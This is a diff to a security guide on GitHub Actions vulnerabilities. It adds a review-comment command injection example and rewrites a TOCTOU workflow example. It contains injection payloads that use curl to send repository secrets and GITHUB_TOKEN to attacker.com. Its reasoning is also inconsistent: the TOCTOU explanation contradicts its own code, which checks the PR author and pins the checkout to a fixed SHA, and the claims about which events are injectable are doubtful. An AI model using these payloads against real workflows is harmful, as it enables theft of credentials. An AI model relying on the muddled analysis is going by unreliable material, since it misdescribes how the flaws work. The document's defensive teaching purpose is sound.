@@ -70,6 +70,45 @@ jobs:
 
 In this example, an attacker could comment `/deploy prod; curl http://attacker.com/exfil?token=$SECRET_TOKEN;` to inject additional commands that would be executed by the workflow.
 
+### Pull Request Review Injection
+
+Pull request review events are particularly dangerous because they can only be triggered from feature branches, making them harder to detect and restrict.
+
+#### Example Vulnerable Workflow
+
+```yaml
+name: Review Response Handler
+on:
+  pull_request_review:
+    types: [submitted]
+
+jobs:
+  process-review:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Process review feedback
+        run: |
+          echo "Processing review: ${{ github.event.review.body }}"
+          # Vulnerable: directly using review body in command
+          FEEDBACK=$(echo "${{ github.event.review.body }}" | grep -o "feedback:.*")
+          ./process_feedback.sh "$FEEDBACK"
+```
+
+#### Why It's Dangerous
+
+**Critical Security Note**: The `pull_request_review` event is only injectable from feature branches, not from forks. This means:
+
+1. **Higher privilege**: Attackers who can create feature branches typically have write access to the repository
+2. **Harder to detect**: Review-based attacks may be overlooked compared to obvious pull request attacks
+3. **Trusted context**: Reviews appear in a trusted context, making malicious payloads less suspicious
+
+An attacker with write access could submit a review with malicious content like:
+```
+This looks good! feedback: good"; curl http://attacker.com/exfil?secrets=$GITHUB_TOKEN; echo "
+```
+
+This would result in command injection when the workflow processes the review body.
+
 ## TOCTOU Vulnerabilities
 
 Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities occur when there's a gap between when a workflow checks conditions and when it uses resources.
@@ -87,28 +126,36 @@ name: TOCTOU Vulnerable Workflow
 on:
   workflow_dispatch:
     inputs:
-      branch:
-        description: 'Branch to deploy'
+      pr_number:
+        description: 'Pull request number to deploy'
         required: true
 
 jobs:
   deploy:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
-        with:
-          ref: ${{ github.event.inputs.branch }}
-      - name: Check if user has write access
+      - name: Get PR details
+        id: get_pr
+        run: |
+          PR_DATA=$(gh api repos/${{ github.repository }}/pulls/${{ github.event.inputs.pr_number }})
+          echo "::set-output name=head_sha::$(echo $PR_DATA | jq -r .head.sha)"
+          echo "::set-output name=author::$(echo $PR_DATA | jq -r .user.login)"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Check if PR author has write access
         id: check_permissions
         run: |
-          # Check if user has write access to the branch
-          if [[ $(gh api repos/${{ github.repository }}/collaborators/${{ github.actor }}/permission | jq -r .permission) == "write" ]]; then
+          # Check if PR author has write access
+          if [[ $(gh api repos/${{ github.repository }}/collaborators/${{ steps.get_pr.outputs.author }}/permission | jq -r .permission) == "write" ]]; then
             echo "::set-output name=has_permission::true"
           else
             echo "::set-output name=has_permission::false"
           fi
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - uses: actions/checkout@v3
+        with:
+          ref: ${{ steps.get_pr.outputs.head_sha }}
       - name: Deploy
         if: steps.check_permissions.outputs.has_permission == 'true'
         run: ./deploy.sh
@@ -118,7 +165,7 @@ jobs:
 
 ### Why It's Dangerous
 
-In this example, an attacker could have write access when the check is performed, but lose it before the deployment step. Alternatively, they could modify the branch content after the check but before the deployment.
+The real vulnerability occurs when a user with write access triggers this workflow on a fork's pull request. After the permission check passes (based on the triggering user's permissions), the original PR author can push new malicious code to their fork. The workflow will then execute this malicious code with the elevated permissions, even though the code wasn't reviewed by the authorized user.
 
 ## Self-Hosted Runner Vulnerabilities
 
